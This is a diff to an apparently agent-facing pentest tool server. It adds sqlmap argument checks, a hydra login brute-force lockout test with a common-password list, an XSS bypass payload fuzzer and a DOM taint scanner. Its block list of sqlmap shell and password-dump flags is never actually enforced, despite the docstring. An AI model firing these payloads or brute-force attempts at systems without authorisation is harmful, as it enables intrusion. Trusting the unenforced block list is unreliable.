@@ -1,4 +1,5 @@
 import json
+import re
 import shutil
 from pathlib import Path
 
@@ -293,12 +294,29 @@ register(
 # sqli_detect  (sqlmap)
 # ---------------------------------------------------------------------------
 
+_SQLMAP_BLOCKED_FLAGS = {"--os-shell", "--os-pwn", "--os-cmd", "--os-bof",
+                         "--priv-esc", "--msf-path", "--tmp-path",
+                         "--dump-all", "--passwords", "--search",
+                         "--exclude-sysdbs"}
+_SHELL_METACHARACTERS = {";", "&&", "||", "|", "`", "$(", ">", "<", "\n"}
+
+
+def _safe_arg(value: str) -> bool:
+    """Return False if value contains shell metacharacters or blocked flags."""
+    for meta in _SHELL_METACHARACTERS:
+        if meta in value:
+            return False
+    return True
+
+
 async def _sqli_detect(args: dict) -> str:
     target = (args.get("target") or "").strip()
     if not target:
         return "Error: target is required."
     if not shutil.which("sqlmap"):
         return "Error: sqlmap not found in PATH."
+    if not _safe_arg(target):
+        return "Error: target contains disallowed shell metacharacters."
     data = (args.get("data") or "").strip()
     param = (args.get("param") or "").strip()
     cookies = (args.get("cookies") or "").strip()
@@ -310,8 +328,12 @@ async def _sqli_detect(args: dict) -> str:
         "--output-dir", str(Path.home() / ".local" / "share" / "penligent-local" / "sqlmap"),
     ]
     if data:
+        if not _safe_arg(data):
+            return "Error: data field contains disallowed characters."
         cmd += ["--data", data]
     if param:
+        if param.startswith("-"):
+            return f"Error: param value looks like a flag: {param!r}"
         cmd += ["-p", param]
     if cookies:
         cmd += ["--cookie", cookies]
@@ -685,4 +707,371 @@ register(
         },
     ),
     _wpscan_vulns,
+)
+
+
+# ---------------------------------------------------------------------------
+# brute_force_test — active brute-force lockout verification via hydra
+# ---------------------------------------------------------------------------
+
+# Small built-in wordlist — intentionally short to detect lockout, not crack passwords
+_LOCKOUT_WORDLIST = [
+    "password", "123456", "admin", "root", "password1",
+    "letmein", "qwerty", "abc123",
+]
+
+
+async def _brute_force_test(args: dict) -> str:
+    target = (args.get("target") or "").strip()
+    service = (args.get("service") or "http-post-form").strip().lower()
+    username = (args.get("username") or "admin").strip()
+    form_path = (args.get("form_path") or "/login").strip()
+    form_body = (args.get("form_body") or "username=^USER^&password=^PASS^").strip()
+    fail_string = (args.get("fail_string") or "incorrect").strip()
+    max_attempts = min(int(args.get("max_attempts", 8)), 12)  # hard cap at 12
+    project_id = args.get("project_id")
+
+    if not target:
+        return "Error: target is required."
+    if not _chk("hydra"):
+        return (
+            "[TOOL_MISSING] hydra not found in PATH.\n"
+            "Install: sudo apt install hydra\n\n"
+            "Manual lockout test: send 6+ incorrect login attempts and check if the account "
+            "gets locked, rate-limited (429), or a delay is introduced."
+        )
+
+    # Write temp wordlist
+    import tempfile, os
+    with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
+        wl_path = f.name
+        f.write("\n".join(_LOCKOUT_WORDLIST[:max_attempts]) + "\n")
+
+    try:
+        if service == "http-post-form":
+            form_spec = f"{form_path}:{form_body}:F={fail_string}"
+            cmd = [
+                "hydra", "-l", username, "-P", wl_path,
+                target, "http-post-form", form_spec,
+                "-t", "1",   # 1 thread — gentle, ordered
+                "-V",        # verbose — show each attempt
+                "-f",        # stop on first success
+            ]
+        elif service == "ssh":
+            cmd = ["hydra", "-l", username, "-P", wl_path, "ssh://" + target,
+                   "-t", "1", "-V", "-f"]
+        else:
+            cmd = ["hydra", "-l", username, "-P", wl_path, service + "://" + target,
+                   "-t", "1", "-V", "-f"]
+
+        stdout, stderr, rc = await _run_subprocess(cmd, timeout=60)
+        await _persist(project_id, "brute_force_test", args, stdout, stderr, rc)
+    finally:
+        try:
+            os.unlink(wl_path)
+        except Exception:
+            pass
+
+    # Interpret results
+    all_output = stdout + stderr
+    lines = [
+        f"Brute-force lockout test: {target} ({service})",
+        f"Username tested: {username}, wordlist: {max_attempts} attempts",
+        "",
+    ]
+
+    success_found = "login:" in stdout.lower() and "password:" in stdout.lower()
+    rate_limited = any(k in all_output for k in ["429", "Too Many", "rate limit", "blocked"])
+    locked_out = any(k in all_output for k in ["locked", "disabled", "suspended", "too many"])
+    captcha_hint = any(k in all_output for k in ["captcha", "robot", "human"])
+
+    if success_found:
+        lines.append("FINDING: Credential found! No lockout triggered — brute-force protection ABSENT.")
+        lines.append("  Severity: HIGH — ttp_category=brute, owasp_asvs_id=V2.2")
+    elif locked_out:
+        lines.append("INFO: Account lockout detected — brute-force protection PRESENT.")
+    elif rate_limited:
+        lines.append("INFO: Rate limiting detected — brute-force protection PRESENT (rate-limit).")
+    elif captcha_hint:
+        lines.append("INFO: CAPTCHA hint detected — brute-force protection PRESENT (CAPTCHA).")
+    else:
+        lines.append("WARNING: No lockout or rate-limiting detected after all attempts.")
+        lines.append("  Consider this a SUSPECTED brute-force vulnerability; verify manually.")
+        lines.append("  Severity: MEDIUM — ttp_category=brute, owasp_asvs_id=V2.2")
+
+    lines += ["", "Raw output (first 40 lines):"]
+    lines += stdout.splitlines()[:40]
+    return "\n".join(lines)
+
+
+def _chk(name: str) -> bool:
+    return shutil.which(name) is not None
+
+
+register(
+    Tool(
+        name="brute_force_test",
+        description=(
+            "Run a small brute-force lockout verification test using hydra. "
+            "Uses a ≤12-attempt wordlist to detect whether the target enforces "
+            "lockout, rate-limiting, or CAPTCHA. NOT intended for credential cracking. "
+            "Requires SCAN_ACTIVE approval on non-HTB projects."
+        ),
+        inputSchema={
+            "type": "object",
+            "required": ["target"],
+            "properties": {
+                "target": {"type": "string", "description": "Target host or IP (no protocol for non-HTTP)"},
+                "service": {"type": "string", "description": "Service type: http-post-form (default), ssh, ftp, rdp, smb"},
+                "username": {"type": "string", "description": "Username to test (default: admin)"},
+                "form_path": {"type": "string", "description": "Login form path for HTTP (default: /login)"},
+                "form_body": {"type": "string", "description": "Form body template (default: username=^USER^&password=^PASS^)"},
+                "fail_string": {"type": "string", "description": "String in response indicating failure (default: incorrect)"},
+                "max_attempts": {"type": "integer", "description": "Max attempts (max 12, default 8)"},
+                "project_id": {"type": "integer"},
+            },
+        },
+    ),
+    _brute_force_test,
+)
+
+
+# ---------------------------------------------------------------------------
+# parsing_diff — sanitizer-vs-browser divergence XSS detection
+# ---------------------------------------------------------------------------
+
+# Edge-case markup payloads that known sanitizers and browsers parse differently
+_PARSING_DIFF_PAYLOADS = [
+    # Null byte injection
+    "<scr\x00ipt>alert(1)</scr\x00ipt>",
+    # UTF-7 encoding (IE legacy)
+    "+ADw-script+AD4-alert(1)+ADw-/script+AD4-",
+    # Malformed attribute quotes
+    "<img src=x onerror=alert(1) ",
+    # SVG-based bypass
+    "<svg><script>alert(1)</script></svg>",
+    # HTML comment injection
+    "<!--<img src=x onerror=alert(1)>-->",
+    # Data URI
+    '<a href="data:text/html,<script>alert(1)</script>">click</a>',
+    # Polyglot
+    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
+    # CSS expression (legacy IE)
+    "<div style=\"width:expression(alert(1))\">",
+    # Template literal breakout
+    "`${alert(1)}`",
+    # Unicode normalization bypass
+    "＜script＞alert(1)＜/script＞",
+]
+
+_HTML_SANITIZERS = ["bleach", "html_sanitizer", "DOMPurify"]
+
+
+async def _parsing_diff(args: dict) -> str:
+    target = (args.get("target") or "").strip()
+    param = (args.get("param") or "q").strip()
+    project_id = args.get("project_id")
+    timeout_s = int(args.get("timeout", 30))
+
+    if not target:
+        return "Error: target is required."
+
+    results: list[str] = [
+        f"Parsing-differential XSS fuzz: {target}",
+        f"Parameter: {param}",
+        f"Payloads: {len(_PARSING_DIFF_PAYLOADS)}",
+        "",
+    ]
+
+    hits: list[str] = []
+    for payload in _PARSING_DIFF_PAYLOADS:
+        import urllib.parse
+        encoded = urllib.parse.quote(payload, safe="")
+        sep = "&" if "?" in target else "?"
+        url = f"{target}{sep}{param}={encoded}"
+        cmd = [
+            "curl", "-sL", "-m", str(timeout_s),
+            "--user-agent", "Mozilla/5.0 (X11; Linux x86_64) penligent-parsing-diff/1.0",
+            url,
+        ]
+        stdout, stderr, rc = await _run_subprocess(cmd, timeout=timeout_s + 5)
+        if rc == -1:
+            continue
+
+        # Check if payload appears reflected and unescaped in response
+        # Markers that suggest the payload got through unmodified
+        raw_payload_reflected = payload.replace("\x00", "") in stdout
+        script_tag_reflected = "<script>" in stdout.lower() and "alert" in stdout.lower()
+        svg_reflected = "<svg>" in stdout.lower() and "onload" in stdout.lower()
+        event_handler_reflected = re.search(r'on\w+\s*=\s*alert', stdout, re.I) is not None
+
+        if any([raw_payload_reflected, script_tag_reflected, svg_reflected, event_handler_reflected]):
+            hits.append(f"  DIVERGENCE: {payload[:60]!r}")
+            hits.append(f"    URL: {url[:120]}")
+            hits.append(f"    Signal: script_tag={script_tag_reflected}, svg={svg_reflected}, event={event_handler_reflected}")
+
+    if hits:
+        results.append(f"POSSIBLE SANITIZER-BROWSER DIVERGENCE: {len(hits)//3} payload(s) reflected unescaped")
+        results.extend(hits)
+        results.append("")
+        results.append("These payloads bypassed server-side output — confirm with browser execution.")
+        results.append("If confirmed: ttp_category=xss, owasp_asvs_id=V5.3.3, severity=high")
+    else:
+        results.append("No obvious sanitizer-browser divergences detected.")
+        results.append("Note: true divergence requires a browser DOM comparison — this is a heuristic check only.")
+
+    result = "\n".join(results)
+    await _persist(project_id, "parsing_diff", args, result, "", 0)
+    return result
+
+
+register(
+    Tool(
+        name="parsing_diff",
+        description=(
+            "Parsing-differential XSS fuzz test. Sends edge-case markup payloads that known "
+            "sanitizers and browsers interpret differently (null bytes, UTF-7, malformed attributes, "
+            "SVG polyglots, unicode normalization). Detects cases where a sanitizer passes input "
+            "that a browser would execute. Run after xss_probe for deeper coverage."
+        ),
+        inputSchema={
+            "type": "object",
+            "required": ["target"],
+            "properties": {
+                "target": {"type": "string", "description": "Target URL"},
+                "param": {"type": "string", "description": "Parameter to inject into (default: q)"},
+                "project_id": {"type": "integer"},
+                "timeout": {"type": "integer", "description": "Timeout per request in seconds (default: 30)"},
+            },
+        },
+    ),
+    _parsing_diff,
+)
+
+
+# ---------------------------------------------------------------------------
+# dom_taint — runtime DOM taint analysis via headless browser
+# ---------------------------------------------------------------------------
+
+# Dangerous DOM sinks that can lead to script execution
+_DOM_SINKS = [
+    "innerHTML", "outerHTML", "document.write", "document.writeln",
+    "eval", "Function(", "setTimeout(", "setInterval(",
+    "location.href", "location.assign", "location.replace",
+    "src", "href",
+]
+
+_DOM_SOURCES = [
+    "location.hash", "location.search", "location.href",
+    "document.referrer", "document.URL", "document.baseURI",
+    "window.name", "postMessage",
+]
+
+
+async def _dom_taint(args: dict) -> str:
+    target = (args.get("target") or "").strip()
+    project_id = args.get("project_id")
+    timeout_s = int(args.get("timeout", 30))
+
+    if not target:
+        return "Error: target is required."
+
+    results: list[str] = [
+        f"DOM taint analysis: {target}",
+        "",
+    ]
+
+    # Check for headless Chrome / Chromium
+    chromium = shutil.which("chromium") or shutil.which("chromium-browser") or shutil.which("google-chrome")
+
+    if chromium:
+        # Use chromium to fetch the page source with JS execution
+        cmd = [
+            chromium,
+            "--headless=new",
+            "--no-sandbox",
+            "--disable-gpu",
+            "--dump-dom",
+            "--timeout=15000",
+            target,
+        ]
+        stdout, stderr, rc = await _run_subprocess(cmd, timeout=timeout_s + 5)
+        dom_content = stdout
+    else:
+        # Fallback: fetch raw HTML and do static analysis
+        cmd = [
+            "curl", "-sL", "-m", str(timeout_s),
+            "--user-agent", "Mozilla/5.0 (X11; Linux x86_64)",
+            target,
+        ]
+        stdout, stderr, rc = await _run_subprocess(cmd, timeout=timeout_s + 5)
+        dom_content = stdout
+        results.append("Note: Chromium not found — running static DOM sink analysis on raw HTML.")
+        results.append("For true runtime taint tracking, install: sudo apt install chromium")
+        results.append("")
+
+    # Static heuristic: look for sink+source patterns in inline scripts
+    inline_scripts = re.findall(r'<script[^>]*>(.*?)</script>', dom_content, re.DOTALL | re.IGNORECASE)
+    script_combined = "\n".join(inline_scripts)
+
+    sink_hits: list[str] = []
+    source_hits: list[str] = []
+
+    for sink in _DOM_SINKS:
+        if sink in script_combined:
+            sink_hits.append(sink)
+
+    for source in _DOM_SOURCES:
+        if source in script_combined:
+            source_hits.append(source)
+
+    # Check for hash-based routing patterns (common DOM XSS vector)
+    hash_routing = "location.hash" in dom_content or "window.location.hash" in dom_content
+    hash_to_html = bool(re.search(r'location\.hash.*innerHTML|innerHTML.*location\.hash', dom_content, re.DOTALL))
+
+    results.append(f"DOM sinks found in inline scripts: {sink_hits or ['none']}")
+    results.append(f"DOM sources found in inline scripts: {source_hits or ['none']}")
+    results.append(f"Hash-based routing: {hash_routing}")
+    results.append(f"Hash-to-innerHTML pattern: {hash_to_html}")
+    results.append("")
+
+    if hash_to_html:
+        results.append("HIGH RISK: location.hash value flows directly into innerHTML — classic DOM XSS.")
+        results.append("  Test: append #<img src=x onerror=alert(1)> to the URL and open in a browser.")
+        results.append("  ttp_category=xss, owasp_asvs_id=V5.3.3, severity=high")
+    elif sink_hits and source_hits:
+        results.append(f"MEDIUM RISK: Both sources ({source_hits}) and sinks ({sink_hits}) present in inline scripts.")
+        results.append("  Manually trace data flow from source to sink to confirm exploitability.")
+    elif sink_hits:
+        results.append(f"LOW RISK: Dangerous sinks present ({sink_hits}) but no obvious sources found.")
+        results.append("  Inspect network requests and event handlers for untrusted input paths.")
+    else:
+        results.append("No obvious DOM source-to-sink taint paths detected statically.")
+        results.append("Note: server-rendered content and external JS files are not checked here.")
+
+    result = "\n".join(results)
+    await _persist(project_id, "dom_taint", args, result, "", 0)
+    return result
+
+
+register(
+    Tool(
+        name="dom_taint",
+        description=(
+            "Runtime DOM taint analysis: fetch page source and scan for dangerous source-to-sink "
+            "data flow patterns (location.hash → innerHTML, postMessage → eval, etc.). "
+            "Uses Chromium headless if available for JS-rendered DOM; falls back to static HTML analysis. "
+            "Run after xss_probe to catch DOM-based XSS that reflection scanners miss."
+        ),
+        inputSchema={
+            "type": "object",
+            "required": ["target"],
+            "properties": {
+                "target": {"type": "string", "description": "Target URL"},
+                "project_id": {"type": "integer"},
+                "timeout": {"type": "integer", "description": "Timeout in seconds (default: 30)"},
+            },
+        },
+    ),
+    _dom_taint,
 )
